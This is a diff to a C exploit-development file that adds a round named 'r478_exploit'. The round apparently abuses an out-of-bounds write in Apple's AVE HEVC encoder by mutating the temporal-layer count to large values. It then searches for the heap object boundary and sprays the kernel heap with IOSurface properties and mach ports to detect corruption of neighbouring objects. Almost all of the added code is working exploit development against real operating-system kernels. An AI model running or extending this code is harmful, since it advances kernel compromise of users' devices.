@@ -19723,6 +19723,344 @@ cleanup_pipes:
     fflush(stdout);
 }
 
+/* ============================================================
+ * r478: NTL mutation boundary finder + IOSurface-based detection
+ *
+ * r477 confirmed: NTL mutation works, encodes succeed up to 4096,
+ * but no pipe corruption — OOB stays within the AVE object allocation.
+ *
+ * This round:
+ *   A) Binary search for the object boundary by testing NTL 5000-16000
+ *      If encode crashes/panics at some NTL, that's the boundary.
+ *   B) Use IOSurface kernel objects (which can be large) as spray targets
+ *      IOSurface backing memory is allocated from the page allocator,
+ *      but the IOSurface kernel struct (~1-4KB) is in kalloc zones.
+ *   C) Spray mach port kernel objects in the same zone as AVE objects
+ *   D) Try OSDictionary expansion — set many IOSurface values to create
+ *      kernel heap allocations of specific sizes adjacent to AVE objects
+ * ============================================================ */
+
+static void r478_ave_cb(void *ref, void *src, OSStatus st,
+                         VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
+    if (ref) (*(int *)ref)++;
+}
+
+static VTCompressionSessionRef r478_make_hevc_mutate(int initial_ntl, int target_ntl, int *cb) {
+    CFMutableDictionaryRef sa = CFDictionaryCreateMutable(
+        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+        &kCFTypeDictionaryValueCallBacks);
+    CFDictionaryRef iop = CFDictionaryCreate(
+        kCFAllocatorDefault, NULL, NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFDictionarySetValue(sa, kCVPixelBufferIOSurfacePropertiesKey, iop);
+    CFRelease(iop);
+
+    int pixfmt = kCVPixelFormatType_32BGRA;
+    CFNumberRef fn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pixfmt);
+    CFDictionarySetValue(sa, kCVPixelBufferPixelFormatTypeKey, fn);
+    CFRelease(fn);
+
+    VTCompressionSessionRef sess = NULL;
+    OSStatus st = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 640, 480, kCMVideoCodecType_HEVC,
+        NULL, sa, NULL, r478_ave_cb, cb, &sess);
+    CFRelease(sa);
+    if (st != noErr) return NULL;
+
+    int v = 1;
+    CFNumberRef n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &v);
+    VTSessionSetProperty(sess, CFSTR("EncoderUsage"), n);
+    CFRelease(n);
+    VTSessionSetProperty(sess, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
+
+    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &initial_ntl);
+    VTSessionSetProperty(sess, CFSTR("NumberOfTemporalLayers"), n);
+    CFRelease(n);
+
+    st = VTCompressionSessionPrepareToEncodeFrames(sess);
+    if (st != noErr) {
+        VTCompressionSessionInvalidate(sess);
+        CFRelease(sess);
+        return NULL;
+    }
+
+    /* Safe encode */
+    CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(sess);
+    CVPixelBufferRef pb = NULL;
+    CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
+    if (pb) {
+        VTCompressionSessionEncodeFrame(sess, pb, CMTimeMake(0, 30),
+            kCMTimeInvalid, NULL, NULL, NULL);
+        CVPixelBufferRelease(pb);
+    }
+
+    /* Mutate */
+    if (target_ntl != initial_ntl) {
+        n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &target_ntl);
+        VTSessionSetProperty(sess, CFSTR("NumberOfTemporalLayers"), n);
+        CFRelease(n);
+    }
+
+    return sess;
+}
+
+static int r478_encode_one(VTCompressionSessionRef sess, int64_t frame) {
+    CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(sess);
+    if (!pool) return -1;
+    CVPixelBufferRef pb = NULL;
+    CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
+    if (!pb) return -2;
+    OSStatus st = VTCompressionSessionEncodeFrame(sess, pb, CMTimeMake(frame, 30),
+        kCMTimeInvalid, NULL, NULL, NULL);
+    CVPixelBufferRelease(pb);
+    return (int)st;
+}
+
+static void r478_exploit(void) {
+    rlog("\n=== r478: NTL boundary finder + large heap spray ===\n\n");
+    fflush(stdout);
+
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+
+    /* Test A: Progressively larger NTL to find the object boundary
+     * Each NTL writes (NTL-7)*4 bytes OOB past the array.
+     * The process dying/panicking at some NTL = we escaped the allocation.
+     * Test each value in a fresh session to isolate failures. */
+    rlog("--- Test A: NTL boundary search ---\n");
+    rlog("  Array at object+0x4678 (18040 bytes into object)\n");
+    rlog("  Each NTL writes (NTL-7)*4 bytes OOB past array end\n");
+    fflush(stdout);
+
+    int test_ntls[] = {
+        4096,   /* +16356 bytes OOB = offset 34396 into object */
+        6000,   /* +23972 = 42012 */
+        8000,   /* +31972 = 50012 */
+        10000,  /* +39972 = 58012 */
+        12000,  /* +47972 = 66012 */
+        13000,  /* +51972 = 70012 */
+        14000,  /* +55972 = 74012 */
+        15000,  /* +59972 = 78012 */
+        16000,  /* +63972 = 82012 */
+    };
+    int n_test = sizeof(test_ntls) / sizeof(test_ntls[0]);
+
+    for (int i = 0; i < n_test; i++) {
+        int ntl = test_ntls[i];
+        int oob_bytes = (ntl - 7) * 4;
+        int total_offset = 0x4678 + ntl * 4;
+
+        int cb = 0;
+        VTCompressionSessionRef s = r478_make_hevc_mutate(8, ntl, &cb);
+        if (!s) {
+            rlog("  NTL=%d: session create FAILED\n", ntl);
+            continue;
+        }
+
+        rlog("  NTL=%d (OOB=%d bytes, obj_offset=0x%x)...",
+             ntl, oob_bytes, total_offset);
+        fflush(stdout);
+
+        int rc = r478_encode_one(s, 1);
+        rlog(" encode=%d cb=%d\n", rc, cb);
+        fflush(stdout);
+
+        VTCompressionSessionCompleteFrames(s, kCMTimePositiveInfinity);
+        VTCompressionSessionInvalidate(s);
+        CFRelease(s);
+
+        if (rc != 0) {
+            rlog("  *** ENCODE FAILED at NTL=%d — boundary near here ***\n", ntl);
+            break;
+        }
+    }
+
+    /* Test B: Create multiple sessions and spray the heap with IOSurface
+     * kernel objects, then trigger OOB to try corrupting adjacent objects.
+     * IOSurface setValue creates OSDictionary entries in kernel heap. */
+    rlog("\n--- Test B: IOSurface setValue spray + NTL OOB ---\n");
+    fflush(stdout);
+    {
+        /* Create 64 IOSurfaces and set many properties on each
+         * to allocate OSDictionary/OSString/OSData in kernel heap */
+        #define R478_N_SURF 64
+        IOSurfaceRef surfs[R478_N_SURF];
+        int surf_ok = 0;
+
+        for (int i = 0; i < R478_N_SURF; i++) {
+            CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int pw = 64, ph = 64, bpe = 4, ppf = 0x42475241;
+            CFNumberRef nw = CFNumberCreate(NULL, kCFNumberIntType, &pw);
+            CFNumberRef nh = CFNumberCreate(NULL, kCFNumberIntType, &ph);
+            CFNumberRef nb = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+            CFNumberRef nf = CFNumberCreate(NULL, kCFNumberIntType, &ppf);
+            CFDictionarySetValue(props, kIOSurfaceWidth, nw);
+            CFDictionarySetValue(props, kIOSurfaceHeight, nh);
+            CFDictionarySetValue(props, kIOSurfaceBytesPerElement, nb);
+            CFDictionarySetValue(props, kIOSurfacePixelFormat, nf);
+            CFRelease(nw); CFRelease(nh); CFRelease(nb); CFRelease(nf);
+
+            surfs[i] = IOSurfaceCreate(props);
+            CFRelease(props);
+            if (!surfs[i]) continue;
+            surf_ok++;
+
+            /* Set multiple properties to allocate kernel heap objects */
+            for (int j = 0; j < 32; j++) {
+                char key[64];
+                snprintf(key, sizeof(key), "spray_%d_%d", i, j);
+                uint32_t val = 0x41414141 + i * 100 + j;
+                CFNumberRef nv = CFNumberCreate(NULL, kCFNumberIntType, &val);
+                IOSurfaceSetValue(surfs[i], CFStringCreateWithCString(
+                    NULL, key, kCFStringEncodingUTF8), nv);
+                CFRelease(nv);
+            }
+        }
+        rlog("  Created %d IOSurfaces with 32 properties each\n", surf_ok);
+        fflush(stdout);
+
+        /* Now create NTL session and trigger OOB */
+        int cb = 0;
+        VTCompressionSessionRef s = r478_make_hevc_mutate(8, 10000, &cb);
+        if (s) {
+            rlog("  Triggering NTL=10000 OOB (~40KB OOB write)...\n");
+            fflush(stdout);
+            int rc = r478_encode_one(s, 1);
+            rlog("  Encode: %d cb=%d\n", rc, cb);
+
+            VTCompressionSessionCompleteFrames(s, kCMTimePositiveInfinity);
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+        }
+
+        /* Check IOSurface properties for corruption */
+        int corrupted = 0;
+        for (int i = 0; i < R478_N_SURF; i++) {
+            if (!surfs[i]) continue;
+            for (int j = 0; j < 32; j++) {
+                char key[64];
+                snprintf(key, sizeof(key), "spray_%d_%d", i, j);
+                CFNumberRef nv = (CFNumberRef)IOSurfaceCopyValue(surfs[i],
+                    CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8));
+                if (!nv) {
+                    rlog("  *** SURF %d key %s: MISSING ***\n", i, key);
+                    corrupted++;
+                    continue;
+                }
+                uint32_t val = 0;
+                CFNumberGetValue(nv, kCFNumberIntType, &val);
+                CFRelease(nv);
+                uint32_t expected = 0x41414141 + i * 100 + j;
+                if (val != expected) {
+                    rlog("  *** SURF %d key %s: CORRUPTED expected=0x%x got=0x%x ***\n",
+                         i, key, expected, val);
+                    corrupted++;
+                }
+            }
+        }
+        rlog("  Properties corrupted: %d / %d\n", corrupted, surf_ok * 32);
+
+        for (int i = 0; i < R478_N_SURF; i++) {
+            if (surfs[i]) CFRelease(surfs[i]);
+        }
+    }
+
+    /* Test C: Mach port spray — allocate many ports, trigger OOB,
+     * check if any port was corrupted (operations on it fail) */
+    rlog("\n--- Test C: Mach port spray + NTL OOB ---\n");
+    fflush(stdout);
+    {
+        #define R478_N_PORTS 1024
+        mach_port_t ports[R478_N_PORTS];
+        int ports_ok = 0;
+
+        for (int i = 0; i < R478_N_PORTS; i++) {
+            kern_return_t kr = mach_port_allocate(mach_task_self(),
+                MACH_PORT_RIGHT_RECEIVE, &ports[i]);
+            if (kr == KERN_SUCCESS) {
+                /* Insert a send right */
+                mach_port_insert_right(mach_task_self(), ports[i], ports[i],
+                    MACH_MSG_TYPE_MAKE_SEND);
+                ports_ok++;
+            } else {
+                ports[i] = MACH_PORT_NULL;
+            }
+        }
+        rlog("  Allocated %d mach ports\n", ports_ok);
+
+        /* Send a message to each port */
+        struct {
+            mach_msg_header_t hdr;
+            uint32_t data[4];
+        } msg;
+        for (int i = 0; i < R478_N_PORTS; i++) {
+            if (ports[i] == MACH_PORT_NULL) continue;
+            memset(&msg, 0, sizeof(msg));
+            msg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+            msg.hdr.msgh_size = sizeof(msg);
+            msg.hdr.msgh_remote_port = ports[i];
+            msg.hdr.msgh_local_port = MACH_PORT_NULL;
+            msg.data[0] = 0xDEAD0000 + i;
+            msg.data[1] = 0xBEEF0000 + i;
+            mach_msg(&msg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                sizeof(msg), 0, MACH_PORT_NULL, 100, MACH_PORT_NULL);
+        }
+        rlog("  Sent messages to ports\n");
+        fflush(stdout);
+
+        /* Trigger large OOB */
+        int cb = 0;
+        VTCompressionSessionRef s = r478_make_hevc_mutate(8, 10000, &cb);
+        if (s) {
+            int rc = r478_encode_one(s, 1);
+            rlog("  NTL=10000 OOB encode: %d cb=%d\n", rc, cb);
+            VTCompressionSessionCompleteFrames(s, kCMTimePositiveInfinity);
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+        }
+
+        /* Check port integrity by receiving messages */
+        int msg_corrupted = 0;
+        for (int i = 0; i < R478_N_PORTS; i++) {
+            if (ports[i] == MACH_PORT_NULL) continue;
+            struct {
+                mach_msg_header_t hdr;
+                uint32_t data[4];
+            } recv;
+            memset(&recv, 0, sizeof(recv));
+            recv.hdr.msgh_size = sizeof(recv);
+            recv.hdr.msgh_local_port = ports[i];
+            kern_return_t kr = mach_msg(&recv.hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                0, sizeof(recv), ports[i], 10, MACH_PORT_NULL);
+            if (kr == KERN_SUCCESS) {
+                if (recv.data[0] != (uint32_t)(0xDEAD0000 + i) ||
+                    recv.data[1] != (uint32_t)(0xBEEF0000 + i)) {
+                    rlog("  *** PORT %d: MSG CORRUPTED d0=0x%x d1=0x%x ***\n",
+                         i, recv.data[0], recv.data[1]);
+                    msg_corrupted++;
+                }
+            } else if (kr != MACH_RCV_TIMED_OUT) {
+                rlog("  *** PORT %d: RECV FAILED kr=0x%x (possibly corrupted) ***\n",
+                     i, kr);
+                msg_corrupted++;
+            }
+        }
+        rlog("  Mach messages corrupted: %d / %d\n", msg_corrupted, ports_ok);
+
+        /* Cleanup */
+        for (int i = 0; i < R478_N_PORTS; i++) {
+            if (ports[i] != MACH_PORT_NULL) {
+                mach_port_deallocate(mach_task_self(), ports[i]);
+                mach_port_mod_refs(mach_task_self(), ports[i],
+                    MACH_PORT_RIGHT_RECEIVE, -1);
+            }
+        }
+    }
+
+    rlog("\n=== r478 complete ===\n");
+    fflush(stdout);
+}
+
 static void r471_exploit(void) {
     rlog("\n=== r471: 8-page IOSurface + large IOV TOCTOU ===\n\n");
     fflush(stdout);
@@ -89794,6 +90132,12 @@ new_modes:
             r472_exploit();
             goto done;
         }
+        if (rounds == 481) {
+            rlog("*** rounds=481: NTL boundary finder + large heap spray ***\n\n");
+            fflush(stdout);
+            r478_exploit();
+            goto done;
+        }
         if (rounds == 480) {
             rlog("*** rounds=480: NTL mutation + pipe spray exploit ***\n\n");
             fflush(stdout);
@@ -92689,7 +93033,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
